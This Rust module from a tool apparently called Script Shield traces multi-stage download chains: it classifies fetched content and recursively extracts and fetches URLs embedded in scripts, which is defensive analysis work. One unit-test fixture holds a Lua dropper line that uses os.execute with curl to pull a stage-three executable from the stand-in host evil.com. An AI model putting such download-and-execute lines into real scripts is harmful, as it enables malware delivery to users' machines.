//! Download-chain resolver for Script Shield.
//!
//! When a fetched resource turns out to be a script, this module parses it for
//! embedded URLs and recursively fetches them, building a tree that represents
//! the full download chain (e.g. script A downloads script B which downloads an
//! executable).

use std::collections::HashSet;

use anyhow::Result;
use regex::Regex;
use serde::{Deserialize, Serialize};
use tracing::{debug, warn};

use super::safe_fetch::{FetchResponse, HttpFetcher};
use super::{ChainEntry, FetchConfig};

/// Classifies the content type of a fetched resource.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ContentType {
    LuaScript,
    JavaScript,
    Python,
    WindowsExecutable,
    DLL,
    Archive,
    HTML,
    PlainText,
    Binary,
    Unknown,
}

/// Resolves multi-stage download chains by recursively fetching and parsing scripts.
#[derive(Debug, Clone)]
pub struct ChainResolver;

impl ChainResolver {
    pub fn new() -> Self {
        Self
    }

    /// Resolve a set of initial URLs into a tree of [`ChainEntry`] nodes.
    ///
    /// For each URL the fetcher downloads the content; if the content is a script
    /// it is scanned for further URLs which are fetched in turn, up to
    /// `config.max_chain_depth` levels deep.
    pub async fn resolve_chain(
        &self,
        initial_urls: Vec<String>,
        fetcher: &HttpFetcher,
        config: &FetchConfig,
    ) -> Result<Vec<ChainEntry>> {
        let mut visited: HashSet<String> = HashSet::new();
        let mut entries = Vec::new();

        for url in initial_urls {
            let entry = self
                .resolve_url(&url, 0, fetcher, config, &mut visited)
                .await;
            entries.push(entry);
        }

        Ok(entries)
    }

    /// Recursively resolve a single URL.
    fn resolve_url<'a>(
        &'a self,
        url: &'a str,
        depth: u32,
        fetcher: &'a HttpFetcher,
        config: &'a FetchConfig,
        visited: &'a mut HashSet<String>,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ChainEntry> + Send + 'a>> {
        Box::pin(async move {
        // Avoid cycles.
        if visited.contains(url) {
            return ChainEntry {
                url: url.to_string(),
                depth,
                response: None,
                children: Vec::new(),
                error: Some("URL already visited in this chain (cycle prevention)".into()),
            };
        }
        visited.insert(url.to_string());

        // Depth guard.
        if depth >= config.max_chain_depth {
            return ChainEntry {
                url: url.to_string(),
                depth,
                response: None,
                children: Vec::new(),
                error: Some(format!(
                    "maximum chain depth ({}) reached",
                    config.max_chain_depth
                )),
            };
        }

        // Fetch.
        let fetch_result = fetcher.fetch_url(url, config).await;

        match fetch_result {
            Ok(response) => {
                let content_type = classify_content(&response, url);
                debug!(
                    url,
                    depth,
                    ?content_type,
                    size = response.size_bytes,
                    "fetched resource"
                );

                // If the response is a script, look for child URLs.
                let child_urls = if is_parseable_script(content_type) {
                    extract_urls_from_script(&response)
                } else {
                    Vec::new()
                };

                let mut children = Vec::new();
                for child_url in child_urls {
                    let child_entry = self
                        .resolve_url(&child_url, depth + 1, fetcher, config, visited)
                        .await;
                    children.push(child_entry);
                }

                ChainEntry {
                    url: url.to_string(),
                    depth,
                    response: Some(response),
                    children,
                    error: None,
                }
            }
            Err(e) => {
                warn!(url, depth, error = %e, "failed to fetch URL");
                ChainEntry {
                    url: url.to_string(),
                    depth,
                    response: None,
                    children: Vec::new(),
                    error: Some(e.to_string()),
                }
            }
        }
        })
    }
}

// ---------------------------------------------------------------------------
// Content classification
// ---------------------------------------------------------------------------

/// Classify the content type of a response using both the Content-Type header
/// and file magic bytes.
pub fn classify_content(response: &FetchResponse, url: &str) -> ContentType {
    let ct = response.content_type.to_lowercase();
    let body = &response.body;
    let lower_url = url.to_lowercase();

    // --- Header-based detection ---
    if ct.contains("text/x-lua") || lower_url.ends_with(".lua") {
        return ContentType::LuaScript;
    }
    if ct.contains("javascript") || lower_url.ends_with(".js") || lower_url.ends_with(".mjs") {
        return ContentType::JavaScript;
    }
    if ct.contains("python") || lower_url.ends_with(".py") {
        return ContentType::Python;
    }
    if ct.contains("text/html") || lower_url.ends_with(".html") || lower_url.ends_with(".htm") {
        return ContentType::HTML;
    }
    if ct.contains("text/plain") {
        // Further refine plain text by checking body content.
        if let Some(ref text) = response.body_text {
            return classify_plain_text(text, &lower_url);
        }
        return ContentType::PlainText;
    }

    // --- Magic-byte detection ---
    if body.len() >= 4 {
        // PE (MZ header).
        if body.starts_with(b"MZ") {
            // Distinguish DLL from EXE by checking PE characteristics if we
            // have enough bytes; otherwise fall back to extension.
            if lower_url.ends_with(".dll") {
                return ContentType::DLL;
            }
            return ContentType::WindowsExecutable;
        }
        // ELF.
        if body.starts_with(b"\x7fELF") {
            return ContentType::Binary;
        }
        // ZIP / RAR / 7z etc.
        if response.is_archive {
            return ContentType::Archive;
        }
    }

    if response.is_archive {
        return ContentType::Archive;
    }
    if response.is_executable {
        return ContentType::WindowsExecutable;
    }

    // Shebang.
    if body.len() >= 2 && body.starts_with(b"#!") {
        if let Some(ref text) = response.body_text {
            let first_line = text.lines().next().unwrap_or("");
            if first_line.contains("python") {
                return ContentType::Python;
            }
            if first_line.contains("lua") {
                return ContentType::LuaScript;
            }
            if first_line.contains("node") || first_line.contains("deno") || first_line.contains("bun") {
                return ContentType::JavaScript;
            }
        }
        return ContentType::PlainText; // generic script
    }

    ContentType::Unknown
}

/// Further classify a plain-text response by peeking at the body.
fn classify_plain_text(text: &str, url: &str) -> ContentType {
    if url.ends_with(".lua") {
        return ContentType::LuaScript;
    }
    if url.ends_with(".js") || url.ends_with(".mjs") {
        return ContentType::JavaScript;
    }
    if url.ends_with(".py") {
        return ContentType::Python;
    }

    // Simple keyword heuristics (very conservative).
    let lower = text.to_lowercase();
    if lower.contains("function(") || lower.contains("function (") || lower.contains("=>") || lower.contains("var ") || lower.contains("const ") || lower.contains("let ") {
        return ContentType::JavaScript;
    }
    if lower.contains("def ") && lower.contains("import ") {
        return ContentType::Python;
    }
    if lower.contains("local ") && (lower.contains("function") || lower.contains("require")) {
        return ContentType::LuaScript;
    }

    ContentType::PlainText
}

/// Whether this content type should be parsed for child URLs.
fn is_parseable_script(ct: ContentType) -> bool {
    matches!(
        ct,
        ContentType::LuaScript
            | ContentType::JavaScript
            | ContentType::Python
            | ContentType::HTML
            | ContentType::PlainText
    )
}

/// Extract URLs from script / text content.
///
/// Uses a simple regex to find `http://` and `https://` URLs embedded in the body text.
fn extract_urls_from_script(response: &FetchResponse) -> Vec<String> {
    let text = match &response.body_text {
        Some(t) => t,
        None => return Vec::new(),
    };

    let mut urls: Vec<String> = Vec::new();
    let mut seen: HashSet<String> = HashSet::new();

    // Match URLs starting with http:// or https://.
    // We intentionally keep the regex broad -- we want to find download URLs
    // even when embedded in string literals.
    let url_re = Regex::new(r#"https?://[^\s"'`<>\)\]\}\\]+"#).expect("valid regex");

    for cap in url_re.find_iter(text) {
        let url = cap.as_str().to_string();
        // Strip trailing punctuation that is commonly part of surrounding syntax.
        let url = url.trim_end_matches(|c: char| matches!(c, ',' | ';' | ')' | ']' | '}' | '\'' | '"'));
        let url = url.to_string();
        if !seen.contains(&url) {
            seen.insert(url.clone());
            urls.push(url);
        }
    }

    debug!(count = urls.len(), "extracted URLs from script body");
    urls
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    fn make_text_response(text: &str, content_type: &str) -> FetchResponse {
        FetchResponse {
            status_code: 200,
            headers: HashMap::new(),
            content_type: content_type.to_string(),
            body: text.as_bytes().to_vec(),
            body_text: Some(text.to_string()),
            size_bytes: text.len() as u64,
            redirect_chain: Vec::new(),
            is_executable: false,
            is_script: true,
            is_archive: false,
            fetch_duration_ms: 10,
        }
    }

    #[test]
    fn test_extract_urls_basic() {
        let resp = make_text_response(
            r#"local payload = "https://evil.com/stage2.lua"
               os.execute("curl https://evil.com/stage3.exe")"#,
            "text/x-lua",
        );
        let urls = extract_urls_from_script(&resp);
        assert_eq!(urls.len(), 2);
        assert!(urls.contains(&"https://evil.com/stage2.lua".to_string()));
        assert!(urls.contains(&"https://evil.com/stage3.exe".to_string()));
    }

    #[test]
    fn test_classify_lua_by_extension() {
        let resp = make_text_response("print('hello')", "text/plain");
        let ct = classify_content(&resp, "https://example.com/init.lua");
        assert_eq!(ct, ContentType::LuaScript);
    }

    #[test]
    fn test_classify_pe_by_magic() {
        let mut body = b"MZ".to_vec();
        body.extend_from_slice(&[0u8; 100]);
        let resp = FetchResponse {
            status_code: 200,
            headers: HashMap::new(),
            content_type: "application/octet-stream".into(),
            body: body.clone(),
            body_text: None,
            size_bytes: body.len() as u64,
            redirect_chain: Vec::new(),
            is_executable: true,
            is_script: false,
            is_archive: false,
            fetch_duration_ms: 5,
        };
        let ct = classify_content(&resp, "https://example.com/payload.exe");
        assert_eq!(ct, ContentType::WindowsExecutable);
    }
}
